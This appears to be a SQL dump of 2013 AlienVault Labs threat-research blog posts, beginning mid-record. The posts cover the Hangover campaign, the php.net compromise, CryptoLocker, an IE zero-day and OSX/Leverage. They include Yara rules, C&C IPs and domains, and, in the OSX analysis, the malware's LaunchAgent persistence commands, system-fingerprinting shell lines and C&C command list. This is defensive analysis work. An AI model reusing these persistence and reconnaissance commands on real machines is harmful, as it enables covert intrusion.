/funbox/rt.php?cn=<MACHINE_NAME>@<USER>&str=&file=no    /joy/rt.php?cn=<MACHINE_NAME>@<USER>&str=&file=no\nYou can look for the pattern “&str=&file=no” in your proxy logs to find infected systems.\n Yara rule:\n rule Hangover2_Downloade {  strings:    $a = \"WinInetGet/0.1\" wide ascii    $b = \"Excep while up\" wide ascii    $c = \"&file=\" wide ascii    $d = \"&str=\" wide ascii    $e = \"?cn=\" wide ascii  condition:    all of them}File stealerIt looks for the following file types on the infected system and exfiltrates them to the C&C server:xls,xlsxdoc,docxppt,pptxpdftxt Network traffic\n\nPerform POST requests, some examples are:POST /crks.php HTTP/1.1 Content-Length: 44 Content-Type: application/x-www-form-urlencoded User-Agent: MyWebClient Host: xxx Connection: Keep-Alive POST /drkl.php HTTP/1.1 Content-Length: 44 Content-Type: application/x-www-form-urlencoded User-Agent: MyWebClient Host: xxx Connection: Keep-Alive POST /max.php HTTP/1.1 Content-Length: 49 Content-Type: application/x-www-form-urlencoded User-Agent: MyWebClient Host: xxx Connection: Keep-Alive \n\nYou can look for HTTP connections with the User-Agent MyWebClientYara rule\n rule Hangover2_stealer{  strings:    $a = \"MyWebClient\" wide ascii    $b = \"Location: {[0-9]+}\" wide ascii    $c = \"[%s]:[C-%s]:[A-%s]:[W-%s]:[S-%d]\" wide ascii   condition:    all of them}Remote shell backdoorNetwork traffic\n\nThis payload is a remote shell backdoor that uses a binary protocol on port 5858. Example traffic:T VICTIM:1050 -> C&C:5858 [A]\n  FHEPF                                                                                                                                                                                                 \n#\nT VICTIM:5858 -> C&C:1050 [AP]\n  Pass                                                                                                                                                                                                   \n#\nT VICTIM:1050 -> C&C:5858 [AP]\n  Authjanettedoe @ [MACHINE_NAME]\\#/[OPERATING_SYSTEM]\\#/[IP_ADDRESS]\\#/   Yara rule\n rule Hangover2_backdoor_shell{  strings:    $a = \"Shell started at: \" wide ascii    $b = \"Shell closed at: \" wide ascii    $c = \"Shell is already closed!\" wide ascii    $d = \"Shell is not Running!\" wide ascii   condition:    all of them}\n\n You can also look for the creation of the following registry key:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinLstart KeyloggerThis payload installs global keyboard hooks to capture keystrokes.Yara rule\n rule Hangover2_Keylogger{  strings:    $a = \"iconfall\" wide ascii    $b = \"/c ipconfig /all > \"\" wide ascii    $c = \"Global\\{CHKAJESKRB9-35NA7-94Y436G37KGT}\" wide ascii  condition:    all of them} Schneebly (Screenshot payload)This payload performs screenshots and upload them to the C&C server.Network traffic\n\nExample traffic:\n\nThe Yara rules can be downloaded from our github repository.Finally this is the list of IP addresses and domain names that are being used by the attackers to host C&C servers and malicious payloads:krickmart.com37.0.125.7737.0.124.106maptonote.commyflatnet.comlampur.comappworldstores.comsimilerwork.netintertechsupport.netlampur.comtwikstore.comWe will continue publishing more information about the Microsoft Office 0day and more IOC\'s as soon as we discover new data.', 'aptalienvaultzerodayofficemicrosofthangover', '/blogs/labs-research/microsoft-office-zeroday-used-to-attack-pakistani-targets');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'PHP.net potentially compromised and redirecting to an exploit kit', 'Jaime Blasco', 'October 24, 2013 ', 'This morning we woke up with news indicating that Google was flagging the php.net website as potentialy harmful. \n\n \nYou can read more information on:\n- http://news.netcraft.com/archives/2013/10/24/php-net-blocked-by-google-false-positive-or-not.html\n- http://barracudalabs.com/2013/10/php-net-compromise/\nWe couldn\'t replicate the behavior as it seem the webmaster modified the files that were producing the malicious redirection. \nAnyway the guys from Barracuda have shared a PCAP file  that shows the malicious behavior.\nBased on that information we have determined that somehow the attackers were able to inject a malicious iframe in the PHP.net website that was redirecting to an Exploit Kit.\nIt seems that as reported by Google the Javascript file www.php.net/userprefs.js had some injected obfuscated content at the end of the file:\n\nIf you deofuscate the content it leads to:\n\nThe content of the file stat.htm is:\n\nThe Javascript code use a publicly available Javascript library to collect information about browser plugins. Once it has collected the information it makes a POST request to the server indicating if the victim has Java and Adobe Acrobat Reader installed in the system:\n\n \nThe server redirects the browser to a server that makes another redirection very likely depending on the plugins detected on the victim:\n\n \nIn the case of the PCAP provided by Barracuda the server is returning HTML code that is embedding some Flash content in the browser as well as a new IFRAME:\n\n\n \nWe have determined that the exploit code present there matches with the Exploit Kit known as Magnitude/Popads. In fact out OTX system flagged that IP address a few days ago as a harmul server due to the serving of Exploit Code.\nhttp://www.alienvault.com/apps/rep_monitor/ip/144.76.192.102/\nAs we can see in our systems using Passive DNS we have found several domain names that are pointing to the same IP address and are being use to host versions of the Magnitude Exploit Kit:\n\n \nThe payload delivered by the Exploit Kit if it is successfull is this one that as we see it has a low detection ratio by AV engines:\n\n \nThis behavior also matches with a report from other user that was seeing similar redirections in this case the content injected in the PHP.net website was hosted in other domain but the infection chain was the same:\n\n \nWe will update this blog post as soon as we have more information about this compromise.\nStay safe!', 'exploit kitphp.net', '/blogs/labs-research/phpnet-potentially-compromised-and-redirecting-to-an-exploit-kit');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'Ransomware now accepts bitcoin as a payment method', 'Alberto Ortega', 'October 17, 2013 ', 'Looking at the evolution of ransomware, accepting bitcoin as a payment method is probably taking too long for most common ransomware families.Not long ago, we have seen a ransomware family that accepts MoneyPak, Ukash, cashU and Bitcoin as payment methods. Its name is CryptoLocker and is detected by Microsoft as Crilock.A.Just one month after Microsoft released the signature, we have seen a high number of infections and activity of this family.The sample we analyzed had the CnC hosted on 212[.]71[.]250[.]4 (this is actually a sinkhole, not a CnC). It has a domain generation algorithm, so the CnC could be in a completely different host in just one day.When the user gets infected, the malware warns and shows some fancy technical information. You can even see a list of files that have been encrypted.In the next step, you can choose your payment method. The bitcoin option looks like this:It seems that the owner of this sample is not having great profits at the moment. We can see in Blockchain his transactions.On the other side, we have seen other Bitcoin addresses used by other samples that had good revenues.Bitcoin gives criminals the benefict of a valuable and (more or less) anonymous coin. The problem for criminals is that Bitcoins are still mostly used by people with a minimum technical background, who are usually tech savvy, and less affected by malware infections.In one way or another, you should never pay to release your files. Try to clean your computer with an anvitirus, they even have tools for these kind of infections. Use your backups. Look for help and IT assistance, or even contact your local authorities.', 'malwareransomwarebitcoin', '/blogs/labs-research/ransomware-now-accepts-bitcoin-as-a-payment-method');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (51, 'OTX Snapshot: Top Malware Detected', 'Jaime Blasco', 'October 16, 2013 ', 'This month, AlienVault launched a new Threat Update Newsletter with the goal of sharing recent threat data from our Open Threat Exchange™ (OTX), as well as recaps of some of the most interesting (or troubling) research and industry news. You can subscribe via e-mail to the Threat Update Newsletter, or subscribe to this blog to get additional information and insight.The threat data we collect through our Open Threat Exchange continually reinforces what those of us in the Lab know to be true: That people and organizations using the Internet for criminal activity are highly coordinated. The tools we see cyber criminals using, and the complexity and scope of attacks speaks to the ‘community’ nature of this underground; cyber criminals liberally share information on attacks, attack tools, techniques, stolen data, etc. It’s time for us “good guys” to steal this collaborative approach and band together to share threat data. The more we each know, the better we can defend the privacy, intellectual property and economic infrastructures entrusted to us.So, in the spirit of sharing what we hope is helpful threat data and information, here are the research findings and headlines for September that were especially interesting to the AlienVault Labs team:More MacOSX Malware\nWhile our Lab finds millions of malware samples per month in Windows and Android, we typically only find a few unique samples a week in MacOSX. This new threat is especially pernicious; it disguises itself to look like an image file and once it is opened, the malware can allow the attacker to perform whatever actions they want. This malware is interesting because it uses a scripting language called Realbasic that provides the possibility of building the code to Windows and Linux platforms, so it’s not so weird to see this malware or this C&C running in other platforms, changing the scripts to focus the targeted platform, obviously.Internet Explorer Zeroday\nThe latest Internet Explorer zero-day has been widely reported, and we’ve seen serious targeted attacks against Japanese and Taiwanese organizations. Unfortunately, we’re still in “wait-and-see” mode until Microsoft provides a patch. My advice is not to use Internet Explorer at the moment. While you could manually apply the interim fix-it, we highly recommend against doing this, as every cyber criminal will be putting the work-around in their framework.DMA Malware\nDirect Memory Access, or DMA, is the latest crack in the door. As reported in this PC World article, graphics cards and peripherals can bypass a computer’s CPU to access and process data directly from memory. Security solutions don’t typically look for malware in peripherals, and once a peripheral infects DMA, there can be a ripple effect of damage. While this type of attack is still a novelty, information security professionals need to be aware of it because this could easily become a more wide-spread attack technique.Data brokers hack\nBrian Krebs investigated and reported on a hack of the major data brokers by an ID theft service that then sells the sensitive data it steals – including social security numbers, birth records and credit and background reports – to any cybercriminal or organization willing to pay. The ID theft service at the heart of this crime ring essentially acts as its own malicious form of data broker, enabling cybercriminals to access and purchase compromised data on the black market. For the legitimate business and consumer data aggregators that were hacked, this is a reminder: even if your business doesn’t suffer a targeted attack, if one of your systems has been infected by a regular botnet, your data is as vulnerable as if you were suffering a targeted attack. This story exemplifies how “bad guys” are collaborating to steal highly personal and valuable information and just generally wreaking havoc. If the good guys within business and government collaborated around threat data as effectively as the bad guys do around threat vectors and tools, attacks of this magnitude would be few and far between.Icefog Cyberspionage campaign\nThis research by Kaspersky Lab elaborates on a series of APT attacks aimed at supply chain organizations primarily in Japan and Korea. The nature of these attacks is very complex, and the threat actor in this case, “Icefog”, gets in-and-out very quickly. While most APTs can go on for a very long time, Icefog hits hard and fast, directly taking control of infected machines during attack. The Icefog attacks show how common attack techniques—spear-phishing or exploits for known vulnerabilities—can be combined with very sophisticated cyber espionage tools to do tremendous damage.September Threat Activity by the Numbers\nThe AlienVault Open Threat ExchangeTM (OTX) database is the largest crowd-sourced repository for threat information around the world. The AlienVault Labs team analyzes and validates this data to ensure it is a reliable source of actionable threat intelligence. See below for key trends from OTX for September:OTX Snapshot: Top Countries by Number of Malicious IPsFor more detailed information, use our interactive threat map to drill into threat details for your specific region.OTX Snapshot: Top Malware DetectedVisit OTX to learn more about how you can benefit from collaborative threat intelligence.', 'malwareotx', '/blogs/labs-research/otx-snapshot-top-malware-detected');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (52, 'Yara rules for leaked KINS toolkit', 'Alberto Ortega', 'October 10, 2013 ', 'Just a few days ago, the source code of the famous KINS banking trojan was leaked.\nKINS is a professional-grade banking trojan, destinated to infect as much computers as possible in order to steal credit cards, bank account credentials and related information from victims. Seen as a replacement to Citadel, it was identified in the wild not long ago. Now, this leak can lead to new variants and malware families.\nIn this toolkit we can find all the source code and compiled versions of the different components, as well as the web panel to manage a botnet. XyliBox made a good analysis of the package.\nAfter study the components, we have written two yara rules to match the dropper and the zeus version used as bot. You can find and freely use them in our github repository.', 'malwareyarabotnetcriminalscrimewarebot', '/blogs/labs-research/yara-rules-for-leaked-kins-toolkit');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (53, 'How public tools are used by malware developers, the antivm tale', 'Alberto Ortega', 'October 4, 2013 ', 'Malware authors are aware of new technologies and research made by the security community. This is palpable when they implement new vulnerability exploitation on their tools or even reuse source code that belongs to public projects.We have discussed antivm and antisandbox analysis tricks seen in malware samples several times.Not long ago we came across a malware sample that had an interesting way to detect if it was being executed in a virtual environment / sandbox.You have probably heard about pafish, a tool that pretend to be a proof of concept regarding this topic. Sadly, it is a matter of time that malware developers use that code to implement these techniques in new developments.Our malware sample had a weird behavior when it was executed in a sandbox or virtual environment. Somehow, it was detecting that the environment was hostile for itself, let\'s see how.It has four different executables embedded on it. One is a copy of pafish, another one a copy of ScoopyNG, and two malicious payloads. At running time it drops and executes the two first ones and it tries to detect if it is running under a virtual machine or sandbox. If none of them detect anything, it drops the malicious payload and continues the execution.We can see it in the malwr.com https://malwr.com/analysis/YzIwNjE5NWU4Yzk3NDlkYmJiNDY4MmU5M2JmMmFjOTk. As you can see, the sandbox has been detected by pafish and the malware has started to create junk files in an infinite loop.Once we have located the routine, patch that jnz loc_4019B0 to disable the detection is an easy task.After patched, the behavior in malwr.com is completely different. It has dropped more files and tried to resolve four different domains, after that, the box is rebooted. To be sure about what happened next, we can try to run it in our own malware analysis machine.After the box is rebooted, this is what we find.So we have a fake AV in the house! The malicious payloads are a dropper that installs a Braviax variant.In this case, those public tools have helped us to disable the detections. It is very positive to release them to the public to train researchers on these topics. Sadly, sometimes you can find this double-edged sword being used in the wild.', 'malwaresandboxreversinganalysisantivm', '/blogs/labs-research/how-public-tools-are-used-by-malware-developers-the-antivm-tale');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (54, 'Identifying suspicious domains using DNS records', 'Jaime Blasco', 'October 2, 2013 ', 'Very often when cybercriminals are migrating to new infrastructure or when the previous has been taken down, they point their domain names (sleep) to temporary specific adresses including but not limited to:127.0.0.1127.0.0.2255.255.255.254255.255.255.2550.0.0.01.1.1.1Besides these, other common addresses where they point their domains are DNS servers and other infrastructure of big internet companies such as Google.We are going to describe a couple of techniques that you can use to implement DNS logging in your environment and look for suspicious domains that follow this rule.PassiveDNSThe first tool that we want to present is Passivedns. It is a set of tools that enable you to sniff traffic from an interface and output the DNS answers to a file that can be inserted into a Mysql database for further querying.In order to process the traffic coming from the DNS servers, you should create a SPAN/Mirror port under your Router/Switch. You can check the following tutorials if you are not familiar with this process:Adding a Monitoring Interface to a Sensor under VMWare ESXHow to configure network monitoring in VMware ESXiHow to Enable IDSConfiguring SPANOnce you are able to receive the traffic from your DNS servers or your internal systems are communicating with external DNS servers, follow the instructions to configure PassiveDNS.After you setup the system, PassiveDNS will start collecting and storing the DNS responses that your internal systems are generating. From there you can use PassiveDNS’s web interface to query the system.The following are a few examples of queries that you can use to identy domains matching the behavior we explained before:Once you have found some of these domains, you can determine wheter or not they are malicious, detect the hosts these DNS queries originated from within your enterprise,find other security events, extract IOC’s, etc.Suricata-2.0beta1 + Alienvault USMThe second solution that we can use is based on the new beta version of Suricata that includes a module to log DNS requests and responses.As you know, both Alienvault USM and OSSIM use Suricata as the IDS engine and we will include this feature in the product once Suricata publishes a stable version with that feature.In the meantime, you can use the process we are going to describe using our Open Source OSSIM version.- First of all, download and compile Suricata-20beta1:\nwget http://www.openinfosecfoundation.org/download/suricata-2.0beta1.tar.gz\ntar xvzf suricata-2.0beta1.tar.gz\ncd suricata-2.0beta1\napt-get install libyaml-dev\napt-get install libmagic-dev\n./configure\nmake- Edit the suricata.yaml config file and add the dns-log statement:\nvi suricata.yaml  - dns-log:\n      enabled: yes\n      filename: dns.log\n      append: yes- Start Suricata:\n./src/suricata -c suricata.yaml -i eth0 (the interface where you see the traffic)If your system is receiving traffic, you will start seeing DNS logs in Suricata’s dns.log file:lienvault:~/suricata-2.0beta1# tail /var/log/suricata/dns.log\n09/18/2013-00:19:53.345953 [**] Query TX 538b [**] data.alienvault.com [**] A [**] 10.49.5.204:47749 -> 8.8.8.8:53\n09/18/2013-00:19:53.345953 [**] Response TX 538b [**] data.alienvault.com [**] A [**] TTL 2076 [**] 70.38.37.7 [**] 8.8.8.8:53 -> 10.49.5.204:47749\n09/18/2013-00:19:53.345953 [**] Query TX c4d3 [**] data.alienvault.com [**] AAAA [**] 10.49.5.204:47749 -> 8.8.8.8:53\n09/18/2013-00:19:53.345953 [**] Response TX c4d3 [**] alienvault.com [**] SOA [**] TTL 161 [**] www.alienvault.com [**] 8.8.8.8:53 -> 10.49.5.204:47749\n09/18/2013-00:19:53.655146 [**] Query TX 3ca8 [**] data.alienvault.com [**] A [**] 10.49.5.204:57663 -> 8.8.8.8:53Now it is time to configure your Alienvault instances to collect this data. We have created a beta plugin that you can use to test this solution.https://github.com/AlienVault-Labs/AlienVaultLabs/tree/master/pluginsCopy the file suricata-dns.cfg to /etc/ossim/agent/plugins/Edit /etc/ossim/ossim_setup.conf and suricata-dns under sensor->detectorsRun alienvault-reconfigCopy the file suricata-dns.sql to /tmp/Execute ossim-db < /tmp/suricata-dns.sqlRestart ossim-agent and ossim-server:/etc/init.d/ossim-agent restart/etc/init.d/ossim-server restartFrom there your OSSIM instance should be processing the logs coming from the Suricata DNS module.In order to create a better view for these type of events, you can create a new view under “Custom Views”->”Create New View”Using that view you should be able to see the following fields:Using the Security Events console you can easily search for domains matching the criteria we want under “More Filters”->Userdata4 like:The advantage of using this console is that you have the IP address of the machine the DNS request originated from, as well as other information about the related system in the same console such as Netflow data, IDS data, inventory, vulnerabilities, security events from other devices, etc. Thanks to that integration, the forensic investigation becomes much easier when you have to check if the system is compromised.', '', '/blogs/labs-research/identifying-suspicious-domains-using-dns-records');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (55, 'Latest Internet Explorer 0day used against Taiwan targets', 'Jaime Blasco', 'September 26, 2013 ', 'Last week, Microsoft published some details regarding a new zero-day vulnerability affecting Internet Explorer that was being used in targeted attacks against Japanese targets as Fireeye published last week.\nWe have identified a version of the exploit hosted on a subdomain of Taiwan\'s Government e-Procurement System. When users visit the main webpage a Javascript code will redirect them to the exploit page if it is the first time the visit the page:\n\nThe exploit contains ROP chains to exploit Windows XP and Windows 7 systems running Internet Explorer 8 and 9. It only exploit systems running the following languages:\n\n \nIf the exploitation is successful the exploit downloads a payload from the IP address 210.177.74.45:\n\nThat is probably a compromised server used to host the malicious payload.\nThe download files is called htl.jpeg and it is a executable file XORED with a one byte key (0x95).\nOnce executed the malware try to contact the following C&C servers:\n- 203.114.64.202\n\n- msdn.techsofts.com\nThe dropper creates the following files:\n\\Temp\\tmp.dat\n\\Temp\\tmp.dll\nIt sends the following HTTP requests:\n\n \n\n \n\n \nWe will continue to post more information about this threat including attribution.\n \nStay safe!', '', '/blogs/labs-research/latest-internet-explorer-0day-used-against-taiwan-users');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (56, 'OSX/Leverage.a Analysis', 'Eduardo De la Arada', 'September 24, 2013 ', 'A few days ago, a new OSX malware was detected in the wild. It looks like a picture and behaves like it when you click on it. Everything looks fine when the clicked picture is opened on the screen, but the malware also performs some other actions.\nAfter the first look, we saw that the malware copies itself to /Users/Shared/UserEvent.app with the ditto command, and creates a LaunchAgent to load itself when the computer starts with these shell commands:\nmkdir ~/Library/LaunchAgents\necho \'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"htt\np://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>RunAtLoad</key><true/><k\ney>KeepAlive</key><true/><key>Label</key><string>UserEvent.System</string><key>ProgramArguments</key>\n<array><string>/Users/Shared/UserEvent.app/Contents/MacOS/UserEvent</string></array></dict></plist>\' > ~/Library/LaunchAgents/UserEvent.System.plist\nFinally, the malware deletes the icon from /Users/Shared/UserEvent.app/Contents/Resources/UserEvent.icns so it doesn\'t look like a picture anymore, avoiding opening the picture again when the user starts-up.\nAfter that, it runs a hidden app to send and receive information from his C&C. It tries to connect to servicesmsc.sytes.net on port 7777 and send information about the device:\n[email protected],1\n|Mac OS X 10.8.3 12D78\n|2 GB RAM\n|25Gi/40Gi free (38% used)\n|VMWVk2PAxDQT42sMNEtz3YFhg\nIt picks the information from these shell commands:\nlogname\nioreg -l | grep \"product-name\" | awk -F\\\" \'{print $4}\'\nsw_vers | awk -F\':\\t\' \'{print $2}\' | paste -d \' \' - - -;\nsysctl -n hw.memsize | awk \'{print $0/1073741824\" GB RAM\"}\';\ndf -hl | grep \'disk0s2\' | awk \'{print $4\"/\"$2\" free (\"$5\" used)\"}\'\nioreg -l | grep \"IOPlatformSerialNumber\" | awk -F\\\" \'{print $4}\'\nThe domain name servicesmsc.sytes.net is not resolving to an IP address anymore but it used to resolv to the IP address 199.127.102.242.\nIf we take a deeper look at the disassembled code, we can see that the virus is written in Realbasic, which makes the work a bit tough. The strings are not referenced from the code. Instead of that, Realbasic uses an indirect table level. So redefining each group of bytes as a structure, we could get the xref of each string and we could locate them in the code.\nIn the function names we could see two interesting groups: the network ones and the Window1 ones. Let\'s take a look at the Window1 group. If we see a Window1 in the code it is because the app has a graphical interface, right? So let\'s search for the visible boolean and change it.\nWe could find the value 0 next to the string serverVisible. You could change it with this Radare oneliner:\necho \'wx 01 @ 0x001c8769\' | r2 -w DSC00117.app/Contents/MacOS/UserEvent\nThen, when the app has started, it shows this server Window:\n\nWhen the button is clicked a msgbox is shown with the output of the folder \'/\':\n\nOn the other side, if we continue looking at the network functions, we can realize that they use the easytcpsocket wrapper from Realbasic. This wrapper uses a private protocol with the following structure:\n[package size ] [package number ] [msg]\nWith this structure we can send specific crafted packages to talk with the bot.\nSo, listing the strings with the xref pointing to the easytcpsocket receiver we can figure out which are the available commands from the C&C.\nps -x | awk \'{print $1|$4}\'\nrm\nkill\nwhoami\ncat\nosascript -e \'input volume of (get volume settings)\'\nosascript -e \'tell Application \'System Events\' to set volume input volume \',0\nosascript -e \'tell application \"System Events\" to get the hidden of every login item\'\nosascript -e \'tell application \"System Events\" to get the name of every login item\'\nosascript -e \'tell application \"System Events\" to get the path of every login item\'\nosascript -e \'tell application \"System Events\" to delete login item \'\nosascript -e \'tell application \"System Events\" to make new login item with properties {path:, hidden:true} at end\'\nWe can observe some Osascript commands to modify loginItems. The attacker is able to create a specific hidden loginItem to load his software at the start (not only with the launch agent), modify and delete them. Also it\'s able to get the current volume of the target and change it to the level it wants to, list processes and their pids, kill them, get file info and remove files.\nTo finish this analysis, I would like to clarify that Realbasic provides the possibility of building the code to Windows and Linux platforms, so it’s not so weird to see this malware or this C&C running in other platforms, changing the scripts to focus the targeted platform, obviously.\nIf you suspect that you have been infected with this malware, you can check if there is an UserEvent app in /Users/Shared/ folder and remove it. This avoids the malware to start on new computer starts-up. On the other hand, right now the C&C is down, so you can start a service listening on port 7777 and verify if the malware is already running in your box.\n\nFrom AlienVault we want to provide you a snort rule to detect the network behavior and a Yara rules to detect the executable file. You can download the rules from our GitHub account.', 'macosxosxleverage.asea', '/blogs/labs-research/osx-leveragea-analysis');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (57, 'Announcing a new free service: Reputation Monitor Alert', 'Jaime Blasco', 'September 17, 2013 ', 'A few weeks ago we launched a new free service called Reputation Monitor Alert. The service aims to alert companies about potential compromised systems and other security problems in their infrastructure. To do this we use all the threat intelligence we gather using our IP reputation database among other external reputation sources.\nOnce you login you just have to enter the domains, networks and IP addresses that you want to monitor.\n\nFrom that moment the system will send you an alert every time our systems detect a potential compromise or suspicious behaviour including:\nMalicious behavior detected using our OTX system.\nDNSBL blacklists\nDNS changes\nSSL changes\nInformation about your assets in pastebin, pastie, etc.\n\n \n\nThe detection engine uses the threat data our internal systems collect and the information that Alienvault OSSIM and USM users can voluntarily contribute from a wide range of devices in their environment (firewalls, proxies, web servers, anti-virus systems, and intrusion detection/prevention systems). This data is automatically processed, aggregated, validated and enriched. By gathering theat data from a diverse install base, across many industries and countries and companies of all sizes and mixing this with new threat vectors, our engine is able to discover and alert you when one of your assets has been compromised or presents suspicious behaviour.', 'ossimalienvaultotxthreat intelligencethreat datareputation', '/blogs/labs-research/announcing-a-new-free-service-reputation-monitor-alert');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (58, 'Several domains including New York Times and Twitter ones attacked by Syrian Electronic Army', 'Jaime Blasco', 'August 27, 2013 ', 'During the last few hours several domains including the one from The New York Times have been redirected to a Syrian Electronic Army server. Here is the list of domains pointing to that server:\nReturned 39 RRs in 1.50 seconds.\nsokiland.fr.nf. A 141.105.64.37\nsea.sy. A 141.105.64.37\nm.sea.sy. A 141.105.64.37\nmob.sea.sy. A 141.105.64.37\nwww.mob.sea.sy. A 141.105.64.37\nleaks.sea.sy. A 141.105.64.37\nwww.leaks.sea.sy. A 141.105.64.37\nstorm-paradize.us. A 141.105.64.37\nwww.storm-paradize.us. A 141.105.64.37\ndns1.storm-paradize.us. A 141.105.64.37\ndns2.storm-paradize.us. A 141.105.64.37\nstorm-paradize.biz. A 141.105.64.37\nns1.storm-paradize.biz. A 141.105.64.37\nns2.storm-paradize.biz. A 141.105.64.37\nsea.twimg.com. A 141.105.64.37\nsea2.twimg.com. A 141.105.64.37\nnytimes.com. A 141.105.64.37\nsea.nytimes.com. A 141.105.64.37\nsea4.nytimes.com. A 141.105.64.37\nsharethis.com. A 141.105.64.37\nw.sharethis.com. A 141.105.64.37\nqatar-leaks.com. A 141.105.64.37\nwww.qatar-leaks.com. A 141.105.64.37\nperfectpsyche.com. A 141.105.64.37\nstorm-paradize.com. A 141.105.64.37\nwww.storm-paradize.com. A 141.105.64.37\nsyrianelectronicarmy.com. A 141.105.64.37\nns1.syrianelectronicarmy.com. A 141.105.64.37\nns2.syrianelectronicarmy.com. A 141.105.64.37\nwww.syrianelectronicarmy.com. A 141.105.64.37\nleaks.syrianelectronicarmy.com. A 141.105.64.37\nzonemu.net. A 141.105.64.37\nlandesmusic.net. A 141.105.64.37\nstorm-paradize.net. A 141.105.64.37\nstorm-paradize.org. A 141.105.64.37\nwww.storm-paradize.org. A 141.105.64.37\nideal-dimension.org. A 141.105.64.37\nwww.ideal-dimension.org. A 141.105.64.37\ndim-mag.ideal-dimension.org. A 141.105.64.37\nWe can find the domain nytimes.com in the list as well as some Twitter domains such as twimg.com. As we can see in the whois data for twimg.com:\nDomain Name………. twimg.com\nCreation Date…….. 2008-09-23\nRegistration Date…. 2010-07-04\nExpiry Date………. 2014-09-23\nOrganisation Name…. Twitter, Inc.\nOrganisation Address. 1355 Market Street\nOrganisation Address. Suite 900\nOrganisation Address.\nOrganisation Address. San Francisco\nOrganisation Address. 94103\nOrganisation Address. CA\nOrganisation Address. UNITED STATES\nAdmin Name……….. SEA SEA\nAdmin Address…….. SEA\nAdmin Address…….. Suite 900\nAdmin Address……..\nAdmin Address. San Francisco\nAdmin Address…….. 94103\nAdmin Address…….. CA\nAdmin Address…….. UNITED STATES\nAdmin Email………. [email protected]\nAdmin Phone………. +1.4152229670\nAdmin Fax………… +1.4152220922\nTech Name………… SEA SEA\nTech Address……… 1355 Market Street\nTech Address……… Suite 900\nTech Address………\nTech Address……… San Francisco\nTech Address……… 94103\nTech Address……… CA\nTech Address……… UNITED STATES\nTech Email……….. [email protected]\nTech Phone……….. +1.4152229670\nTech Fax…………. +1.4152220922\nName Server………. ns27.boxsecured.com\nName Server………. ns28.boxsecured.com\nIt is very likely that the registrant for those domains has been compromised since the nytimes.com domain is also showing the following:\nDomain Name………. nytimes.com\nCreation Date…….. 1994-01-18\nRegistration Date…. 2011-08-31\nExpiry Date………. 2014-01-20\nOrganisation Name…. SEA\nOrganisation Address. 620 8th Avenue\nOrganisation Address.\nOrganisation Address.\nOrganisation Address. New York\nOrganisation Address. 10018\nOrganisation Address. NY\nOrganisation Address. UNITED STATES\nAdmin Name……….. SEA SEA\nAdmin Address…….. SEA\nAdmin Address…….. 620 8th Avenue\nAdmin Address……..\nAdmin Address. Syria\nAdmin Address…….. 10018\nAdmin Address…….. SY\nAdmin Address…….. SYRIAN ARAB REPUBLIC\nAdmin Email………. [email protected]\nAdmin Phone………. +1.2125561234\nAdmin Fax…………\nTech Name………… NEW YORK TIMES DIGITAL\nTech Address……… 229 West 43d Street\nTech Address………\nTech Address………\nTech Address……… New York\nTech Address……… 10036\nTech Address……… NY\nTech Address……… UNITED STATES\nTech Email……….. [email protected]\nTech Phone……….. +1.2125561234\nTech Fax…………. +1.1231231234\nName Server………. ns27.boxsecured.com\nName Server………. ns28.boxsecured.com\nWe will keep you up to date once we discover more information about how the Syrian Electronic Army took over the domain names.\nStay safe!\nUpdate:\nIt seems other domains such as huffingtonpost.co.uk and twitter.co.uk. were also affected:\nRdata results for ANY/ns1.syrianelectronicarmy.com.\nReturned 6 RRs in 0.02 seconds.\nsea.sy. NS ns1.syrianelectronicarmy.com.\ntwitter.co.uk. NS ns1.syrianelectronicarmy.com.\nhuffingtonpost.co.uk. NS ns1.syrianelectronicarmy.com.\ntwimg.com. NS ns1.syrianelectronicarmy.com.\nnytimes.com. NS ns1.syrianelectronicarmy.com.\nsharethis.com. NS ns1.syrianelectronicarmy.com.', '', '/blogs/labs-research/several-domains-including-new-york-times-and-twitter-ones-attacked-by-syria');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (59, 'Hunting for malware with undocumented instructions', 'Jaime Blasco', 'July 1, 2013 ', 'A few days ago Microsoft Malware Protection Center published a great blog post about some undocumented instruction tricks being used by several malware families.As you can read in the post, they found some malware samples usingÂ FPU instructionsÂ Â that lead to incorrect disassembly in several debuggers and disassemblers.I decided to write a small Python script to help us identify this trick and potentially other similar ones. The script basically tries to disassemble the first ten instructions at the entry point of an executable using Pefile andÂ PydasmÂ and it will warn you if some instructions can’t be disassembled.$ python2.7 disaep.py -i ./714472dfd11dcd8efe79d592ca990b95.exe558bec6aff68c00b4900push ebpmov ebp,esppush byte 0xffffffffpush dword 0x490bc0You can use the script to scan your malware repository for samples showing this behavior. Let’s see some examples:/malware/000ef67eaa3be4e6adda140cecbfee792b40538f4a65430ab15fafa2a3ef6e27.exedcdcdfdfdfdbe9d2e9ffUnknown Opcode/malware/98ce5fdddf436a6951ee5a1180afd2c6d1097924d47f7f12ce3904db29c467e4.exedfd8556aff68a0604000Unknown Opcode/malware/ef5a2a3936b900063dd761817ab5bc1dc93cf52067ed3371b360d49c83ca7fa0.exedfdfdfdfdfdfdfdfdfdfUnknown OpcodeAs Microsoft says in the blog post most of the samples we have found are from either the Farfli or Zegost family.Using this information we have created a Yara rule that can be used to detect these FPU’s at the entry point:Finally Microsoft mentioned that they couldn’t find any mention to this trick in the underground forums but we found this post from last year that could be 